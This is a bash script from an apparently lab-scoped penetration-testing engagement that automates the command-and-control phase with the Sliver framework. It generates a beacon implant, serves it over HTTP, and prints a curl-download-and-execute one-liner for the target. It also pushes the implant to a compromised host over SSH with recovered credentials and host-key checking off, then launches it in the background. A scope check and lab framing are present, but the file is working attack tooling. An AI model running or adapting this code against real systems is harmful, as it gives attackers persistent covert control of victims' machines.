#!/usr/bin/env bash
# Phase 6 — Command & Control (session label: c2)
# Sets up a Sliver C2 beacon from the attack host to a compromised lab device.
# Sliver is the open-source C2 framework used per the supervisor's catalogue.
#
# Usage (from the engagement root):
#   ./06_c2/c2.sh gen    <lhost> <lport>           # generate a beacon implant
#   ./06_c2/c2.sh serve  <lhost> <lport>           # start HTTP listener + one-liner server
#   ./06_c2/c2.sh beacon <target_ip> <lhost> <lport>  # deploy beacon to a compromised host via SSH
#   ./06_c2/c2.sh list                             # list active beacons in sliver-client
#
# ATT&CK: T1071 (Application Layer Protocol), T1571 (Non-Standard Port)
# Kill-chain phase: Command and Control
# Session label: c2
#
# Precondition: a foothold exists on target_ip (SSH creds or shell from 04/05 phases).
# Sliver install: see 01_setup/attack-host-setup.md  (curl https://sliver.sh/install | sudo bash)
. "$(dirname "$0")/../lib.sh"

LABEL=c2

need() {
  for t in "$@"; do
    command -v "$t" >/dev/null 2>&1 || { echo "[!] $t missing — see 01_setup/attack-host-setup.md"; exit 3; }
  done
}

# ---------------------------------------------------------------------------
# gen: generate a Sliver beacon implant for the lab target architecture.
# The beacon calls back over HTTP on the specified lhost:lport.
# Output: runs/c2/<ts>_<lhost>/beacon.<platform>  +  cmd.txt
# ---------------------------------------------------------------------------
do_gen() {
  local lhost="${1:?usage: c2.sh gen <lhost> <lport>}" lport="${2:-4444}"
  need sliver-server
  local dir; dir=$(new_run "$LABEL" "all")

  echo "[*] Generating Sliver HTTP beacon implant"
  echo "    lhost=${lhost}  lport=${lport}  arch=linux/arm  (adjust for target platform)"

  # sliver-server runs headless; pipe commands via stdin
  local cmd="sliver-server -- generate beacon --http ${lhost}:${lport} --os linux --arch arm --save ${dir}/beacon.elf --name lab_beacon"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"

  # Run non-interactively via sliver daemon RPC (requires sliver-server already daemonised)
  sliver-server -- generate beacon \
      --http "${lhost}:${lport}" \
      --os linux --arch arm \
      --save "${dir}/beacon.elf" \
      --name lab_beacon 2>&1 | tee "${dir}/gen.txt" || true

  echo
  echo "[*] Implant written to: ${dir}/beacon.elf"
  echo "[*] Next: ./06_c2/c2.sh serve ${lhost} ${lport}  (start listener)"
  end_run "$LABEL" "all"
  echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# serve: start a Sliver HTTP listener and a one-liner Python HTTP server to
#        deliver the beacon binary to the compromised host.
# ---------------------------------------------------------------------------
do_serve() {
  local lhost="${1:?usage: c2.sh serve <lhost> <lport>}" lport="${2:-4444}"
  need sliver-server python3

  # Find the most recent beacon binary in runs/c2/
  local beacon; beacon=$(find "${RUNS_DIR}/c2" -name "beacon.elf" 2>/dev/null | sort | tail -1)
  [[ -z "$beacon" ]] && { echo "[!] No beacon.elf found — run 'gen' first"; exit 1; }

  local dir; dir=$(new_run "$LABEL" "all")
  echo "[*] Starting Sliver HTTP listener on ${lhost}:${lport}"

  local listener_cmd="sliver-server -- jobs --http ${lhost}:${lport}"
  local serve_cmd="python3 -m http.server 8888 --directory $(dirname $beacon)"

  save_cmd "$dir" "${listener_cmd} ; ${serve_cmd}"
  echo "+ $listener_cmd"
  sliver-server -- jobs --http "${lhost}:${lport}" 2>&1 | tee "${dir}/listener.txt" &

  echo "+ $serve_cmd  (delivers beacon.elf on port 8888)"
  python3 -m http.server 8888 --directory "$(dirname "$beacon")" 2>&1 | tee "${dir}/httpd.txt" &

  echo "[*] Listener PID: $!  (kill when done)"
  echo "[*] To pull beacon on target:  curl http://${lhost}:8888/beacon.elf -o /tmp/beacon && chmod +x /tmp/beacon && /tmp/beacon &"
  end_run "$LABEL" "all"
  echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# beacon: deploy the beacon to a compromised target via SSH and launch it.
#         Requires SSH creds recovered in phase 4 (brute_force).
# ---------------------------------------------------------------------------
do_deploy() {
  local target="${1:?usage: c2.sh beacon <target_ip> <lhost> <lport>}"
  local lhost="${2:?lhost required}" lport="${3:-4444}"
  require_scope "$target"
  need ssh scp

  local beacon; beacon=$(find "${RUNS_DIR}/c2" -name "beacon.elf" 2>/dev/null | sort | tail -1)
  [[ -z "$beacon" ]] && { echo "[!] No beacon.elf found — run 'gen' first"; exit 1; }

  local dir; dir=$(new_run "$LABEL" "$target")
  echo "[*] Deploying Sliver beacon to ${target} via SSH"

  # SCP + launch; user/pass from previously recovered creds (edit as needed)
  local creds_hint="${RUNS_DIR}/brute_force"
  echo "[!] Edit the SSH user below (check $creds_hint for recovered creds)"
  local SSH_USER="${SSH_USER:-admin}"

  local scp_cmd="scp -o StrictHostKeyChecking=no ${beacon} ${SSH_USER}@${target}:/tmp/sliver_beacon"
  local ssh_cmd="ssh -o StrictHostKeyChecking=no ${SSH_USER}@${target} 'chmod +x /tmp/sliver_beacon && nohup /tmp/sliver_beacon &'"
  save_cmd "$dir" "${scp_cmd} ; ${ssh_cmd}"

  echo "+ $scp_cmd"
  scp -o StrictHostKeyChecking=no "$beacon" "${SSH_USER}@${target}:/tmp/sliver_beacon" 2>&1 | tee "${dir}/scp.txt"

  echo "+ $ssh_cmd"
  ssh -o StrictHostKeyChecking=no "${SSH_USER}@${target}" \
      'chmod +x /tmp/sliver_beacon && nohup /tmp/sliver_beacon > /dev/null 2>&1 &' 2>&1 | tee -a "${dir}/ssh.txt"

  echo "[*] Beacon launched. Confirm in sliver-client:  sliver-client  then  beacons"
  end_run "$LABEL" "$target"
  echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# list: enumerate active beacons via sliver-client (non-interactive stub)
# ---------------------------------------------------------------------------
do_list() {
  need sliver-client
  local dir; dir=$(new_run "$LABEL" "all")
  local cmd="sliver-client -- beacons"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  sliver-client -- beacons 2>&1 | tee "${dir}/beacons.txt" || true
  end_run "$LABEL" "all"
  echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
cmd="${1:-}"; shift || true
case "$cmd" in
  gen)    do_gen    "$@" ;;
  serve)  do_serve  "$@" ;;
  beacon) do_deploy "$@" ;;
  list)   do_list ;;
  *) sed -n '2,16p' "$0"; exit 1 ;;
esac
